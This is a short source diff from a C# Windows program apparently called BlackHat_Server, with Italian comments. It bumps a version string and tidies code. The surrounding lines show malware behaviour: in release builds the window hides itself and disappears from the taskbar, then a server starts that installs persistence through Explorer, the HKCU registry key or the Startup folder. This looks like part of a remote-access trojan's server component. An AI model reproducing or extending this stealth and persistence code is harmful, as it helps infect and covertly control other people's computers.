@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Windows.Forms;
+using BlackHat_Server.Class;
 
 namespace BlackHat_Server
 {
@@ -13,14 +14,14 @@ namespace BlackHat_Server
         private void Host_Load(object sender, EventArgs e)
         {
             // VERSIONE DEL SERVER
-            ST_Client.Instance.ServerVersion = "0.1.1";
+            ST_Client.Instance.ServerVersion = "0.1.2";
 
             #if !DEBUG
             Hide();
             ShowInTaskbar = false;
-
+            
             StartSrv();
-#endif
+            #endif
         }
 
 
@@ -32,10 +33,7 @@ namespace BlackHat_Server
 
         private void StartSrv()
         {
-            // SPOSTATO IN PROGRAM (PRRIMA DI CONTROLLO MUTEX)
-            //CreateStClient cc = new CreateStClient();
-            //cc.InitializeStClient();           
-
+           
 
             // INSTALLAZIONE SERVER
             if (ST_Client.Instance.bUseExplorer || ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseStartupFolder)
